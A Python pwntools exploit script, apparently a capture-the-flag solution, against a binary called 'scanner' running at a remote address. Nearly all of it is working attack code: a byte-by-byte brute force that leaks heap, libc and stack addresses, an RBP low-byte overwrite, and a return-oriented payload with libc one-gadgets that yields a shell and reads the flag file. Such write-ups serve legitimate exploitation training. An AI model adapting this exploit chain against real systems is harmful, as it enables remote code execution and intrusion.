#!/usr/bin/python3

from pwn import *

exe = ELF("./scanner", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '59', '-I']
context.log_level 	= "DEBUG"
isDebug = False

# brva 0x0000000000001877 fgets in update buffer
# brva 0x00000000000018E5 read_parameters (menu scan)
# brva 0x0000000000001215 scanner_naive1 function
# brva 0x000000000000127F cmp al, dl
# brva 0x000000000000124D isFound = 1
# brva 0x0000000000001434 call r8 in run_scanner (goes to selected scanner)
# brva 0x000000000000137D inside run_scanner's calling the func pointer
# brva 0x00000000000018EA right after read_parameters
# brva 0x000000000000175A scanf in menu selection
# brva 0x000000000000158E malloc to get bytesToSearchFor
# brva 0x000000000000137D start of run_scanner
# brva 0x0000000000001850 start of case in switch case wher I update the main buffer
# brva 0x0000000000083898 / b *_IO_getline_info+216      _IO_getline_info+216>    add    rsp, 0x28 returning from here should trigger the ROP chain.

gs = '''
brva 0x00000000000014D7
brva 0x0000000000001529
brva 0x0000000000001215
brva 0x000000000000190A
brva 0x0000000000001331
brva 0x0000000000001434
brva 0x000000000000137D
brva 0x00000000000018EA
brva 0x0000000000001877
brva 0x000000000000158E
brva 0x000000000000137D
brva 0x0000000000001850
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def test_scanner_iteration_calculator(n_times):
	# The loop checks an unsigned number which could be 0xffffffffffffffff agains 0 (when it starts).
	# We can pass a large number that will use two's compliment when checked.
	# n_times is subtracted from the max value + 1.
	return 18446744073709551615 - n_times + 1

def update_buffer(payload):
	io.sendafter(b"> ", b"1")
	io.sendafter(b"buffer: ", payload) # "f" is the egg we will hint for as the last byte.

def update_buffer_for_leaking_addresses(payload):
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"buffer: ", payload) # "f" is the egg we will hint for as the last byte.

def update_buffer_for_rop(payload):
	io.sendlineafter(b"> ", b"1")
	io.sendafter(b"buffer: ", payload) # "f" is the egg we will hint for as the last byte.

def run_scanner(scanner_name = "naive1", allocation_size = 2, bytesToSearchFor = b'\x66\x00'):
	io.sendlineafter(b"> ", b"3")
	io.sendlineafter(b"parameters: ", f"{scanner_name} {allocation_size}".encode())
	io.sendline(bytesToSearchFor)
	return io.recv(timeout=3)  # Receive the response

def test_scanner(scanner_name = "naive1", allocation_size = 2):
	io.sendlineafter(b"> ", b"2")
	io.sendlineafter(b"parameters: ", f"{scanner_name} {allocation_size}".encode())
	io.sendline(b"w" * (allocation_size))
	io.sendlineafter(b"number of iterations: ", b"10")

# Brute-force function
def leak_addresses():
	known_prefix = b"\x66\x00" # This is the egg we are looking for + the null terminator added by scanf during "Update_buffer" call.
	known_bytes = b''  # Initialize known bytes as empty
	dynamic_byte_value = 0  # Initialize the expected dynamic byte value
	dynamic_heap_7th_byte = 0
	payload_size = len(known_prefix) + 1  # Starting payload size: prefix + 1 byte for brute-forcing

	# Brute-force each byte 
	heap_and_libc = 32
	heap_and_libc_stack = 48
	heap_and_libc_and_bin = 64
	heap_and_libc_and_bin_and_stack = 96
	while len(known_bytes) < heap_and_libc_stack:  # Brute-force until we catpure X bytes. We can leak as many as 4096 bytes.
		for byte in range(256):  # All possible byte values (0x00 - 0xff)
			
			# If we are at the position of the dynamic byte, enforce the expected value
			if len(known_bytes) >= 9:
				known_bytes = known_bytes[:8] + p8(dynamic_byte_value) + known_bytes[9:]
				if (dynamic_heap_7th_byte == 0):
					dynamic_heap_7th_byte = known_bytes[1:2]

			# When we reach the 0x19 byte (24th), we need to update the heap address we found earlier because the malloc size has increased,
			# so the memory address is now 0xc0 instead of 0xa0. Check vis for better clarity.
			if (dynamic_byte_value == 0x19):
				known_bytes = known_bytes[:0] + p8(0xc0) + known_bytes[1:]
			
			if (dynamic_byte_value == 0x29):
				known_bytes = known_bytes[:0] + p8(0xf0) + known_bytes[1:]

			if (dynamic_byte_value == 0x39):
				known_bytes = known_bytes[:0] + p8(0x30) + p8(u8(dynamic_heap_7th_byte)+1) + known_bytes[2:]
				
			if (dynamic_byte_value == 0x49):
				known_bytes = known_bytes[:0] + p8(0x80) + p8(u8(dynamic_heap_7th_byte)+1) + known_bytes[2:]   
			
			if (dynamic_byte_value == 0x59):
				known_bytes = known_bytes[:0] + p8(0xe0) + p8(u8(dynamic_heap_7th_byte)+1) + known_bytes[2:]   
			
			# Construct the payload
			payload = flat(
				known_prefix,
				known_bytes,
				p8(byte),  # Add the current byte being brute-forced
				endian='little',
				word_size=64
			)

			# Send the payload and receive the response
			# time.sleep(0.05)
			response = run_scanner(allocation_size=payload_size, bytesToSearchFor=payload)
			
			# Check if the "Found" message is in the response
			if b"Found" in response:
				print(f"Found byte: {hex(byte)}")
				known_bytes += p8(byte)  # Add the found byte to known_bytes
				payload_size += 1  # Increment the payload size for next byte
								
				# Increment the dynamic byte value after finding the dynamic byte
				if len(known_bytes) >= 9:
					if (dynamic_byte_value == 0): # only once, set the value to the found byte after brute forcing it. We will increment this byte each time we find a new byte.
						dynamic_byte_value = byte

					dynamic_byte_value += 1
				break  # Move on to the next byte
			elif byte == 0xff:
				break
				# io,pause()
				# raise Exception("Failed to brute force bytes. Reached 0xff without success.")

	return known_bytes  # Return the found bytes

def overwrite_rbp_lsb():
	run_scanner(scanner_name="w" * 16, allocation_size=2, bytesToSearchFor=b'\x66\x77')

def construct_repeating_payload(one_cycle):
	# Determine how many complete cycles fit into 4096 bytes
	cycle_size = len(one_cycle)
	cycles = 4096 // cycle_size

	# Calculate total size used by the repeated cycles
	used_bytes = cycles * cycle_size

	# Calculate how much padding is needed to reach 4096 bytes
	padding_size = 4096 - used_bytes

	# Construct the payload with flat(), including the padding
	exploit_payload = flat(
		[one_cycle] * cycles,  # Repeat the cycle
		b'\x00' * padding_size,  # Add padding
	)

	return exploit_payload

def calculate_padding():
	# The stack shifts each execution due to ASLR, so we can't know where to put our payload exactlly. We do not know where
	# our target RBP is going to land.
	# But we also know there is a constant offset between some stack addresses.
	# So after leaking an address from the stack, we can see where it is in relation to other items on the stack at run time.
	# One of the items is the strat of the 4096 bytes input buffer. The address we leak is 0x1108 bytes away from the start of the 
	# buffer, so we calculate it.
	buffer_start_address = addr4 - 0x1108
	print(f"{hex(buffer_start_address)=}")

	# We also know that 0xf8 bytes away from the leaked address, is were the value of the address of the valid rbp will be at run time.
	rbp = addr4 - 0xf8

	# we can then pick out the LSB of rbp and know where the corrupted rbp will be placed 
	rbp_lsb = p64(rbp)[:1]
	rbp_lsb_int = u8(rbp_lsb)
	print(f"{hex(rbp_lsb_int)=}")
	rbp_corrupted = rbp - rbp_lsb_int
	print(f"{hex(rbp_corrupted)=}")

	# This gives us how much padding to put from the start of the input padding until we reach the exact location of the corrupted rbp.
	# We can now push valid values so the rest of the program behaves and returns us back to main(). At this point main's RBP is corrupted 
	# and the return address is also corrupted. When we call update_buffer again in the program, fgets will trigger the corrupted
	# return address and we will get a shell.
	padding = buffer_start_address - rbp_corrupted
	print(f"{abs(padding)=}")
	return (abs(padding) - 16, rbp_lsb_int)

def pauseThis():
	print(f"PID: {io.pid}")
	pause()
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
io = remote("94.237.49.138", 47290)
#ip_offset = 56
# io = start_local(isDebug)
# io.timeout = 0.2 # <----- for remote exploit
io.timeout = 0.2
# print(f"PID: {io.pid}")
######## REMOTE ########


# We send in a buffer with 4096 bytes. 4094 of garbage + 1 as the egg we are looking for.
# We use 4094 because the 4096th byte always becomes 0x0a (drop line)
leak_libc_payload = b"w" * 4094 + b"f"
update_buffer_for_leaking_addresses(leak_libc_payload)

# leaking libc - we know we need to look for the 0x66 egg, and we append to it a 0x00. 
print(f"Leaking addresses to calculate stuff...	")
found_bytes = leak_addresses()

# # Convert the found bytes to two 64-bit addresses and print them
addr1 = u64(found_bytes[:8]) # heap
addr2 = u64(found_bytes[24:32]) # libc
# addr3 = u64(found_bytes[56:64]) #bin
addr4 = u64(found_bytes[40:48]) # stack
# addr4 = u64(found_bytes[88:]) # stack

# print(f"Brute-forced memory addresses (heap, libc): {addr1:#018x}, {addr2:#018x}")
print(f"Brute-forced memory addresses (heap, libc, bin, stack): {addr1:#018x}, {addr2:#018x} {addr4:#018x}")
# print(f"Brute-forced memory addresses (heap, libc, bin, stack): {addr1:#018x}, {addr2:#018x} {addr3:#018x} {addr4:#018x}")

heap_offset_32 = 0x2c0
heap_offset_48 = 0x2f0
heap_offset_64 = 0x330
heap_offset_96 = 0x3e0

heap_base = addr1 - heap_offset_48
libc_base = addr2 - 0x24083 # offset to subtract to get libc base (__libc_start_main+243)
libc.address = libc_base

# bin_base = addr3 - 0x00000000000017CA
# stack_base = addr4 - 0x1ef18

# print(f"{hex(bin_base)=}")
print(f"{hex(libc.address)=}")
print(f"{hex(heap_base)=}")
# print(f"{hex(stack_base)=}")

# bin_pop_rdi_offset = 0x00000000000019ab # pop rdi; ret; 
# bin_ret_offset = 0x0000000000001016 # ret;
# bin_pop_rdi_offset = 0x555555554000 + 0x00000000000019ab # pop rdi; ret; 
# bin_ret_offset = 0x555555554000 + 0x0000000000001016


# libc_base = 0x7ffff7dd5000
libc_bin_sh = libc_base + 0x001b45bd
libc_system = libc_base + 0x00052290
libc_pop_rdi = libc_base + 0x0000000000023b6a
libc_ret = libc_base + 0x0000000000022679

buffer_start_address = 0
rbp_lsb_int = 0

# Calculate how much padding we need to place in the buffer before we reach what will be the corrupted RBP address and return address
(padding, rbp_lsb_int) = calculate_padding()
padding = padding + 1
exploit_payload = flat(
	b'w' * padding,
	p64(addr1-0x50), # this is bytesToSearchFor. We pass -0x50 so we will use a different chunk so we dont trigger a double free.
	p64(0x000000000003), # this is scannerIndex (MSB) and amountOfBytesToRead (LSB) (example: 0x000100000003)
	p64(0xaaaaaaaaaaaa), # corrupt rbp (doesn't really matter what value is in here) 
	p64(libc_base + 0xe3b01), # corrupt return address (not sure if this matters either)
	b'w' * (4096 - padding - 32) # pad to 4096 bytes
)

if len(exploit_payload) > 0x1000:
	print(f"Payload too large [{hex(len(exploit_payload))}]. Try again")
	quit()

# pauseThis()
update_buffer(exploit_payload)

# trigger the payload using read_parameters. This will grab 16 bytes of data and will overwrite rbp address with 00 in its LSB
overwrite_rbp_lsb()
sleep(1)

# now craft a payload that updates the primary buffer and when fgets retruns it should preform the ROP chain
# This was hard to accomplish. The stack shifts so I can't know where the return address will need to be placed each run time.
# But! we do know that it is placed 56 bytes less than the the value of the LSB we got earlier from the VALID rbp (before overwriting it).
# By subtracting 56 (magic number) from that, we find the needed padding for the next payload. Magic.
padding = rbp_lsb_int - 56
rop_payload = flat(
	b'\x00' * padding,
	p64(libc_ret),
	p64(libc_base + 0xe3afe),
	b'\x00' * (4096 - padding - 16)
)

# pauseThis()
print(f"We got so far. Lets get a shell...")
update_buffer_for_rop(rop_payload)

sleep(1)
print(f"Getting the flag...")
io.sendline(b"cat flag.txt")
io.interactive()
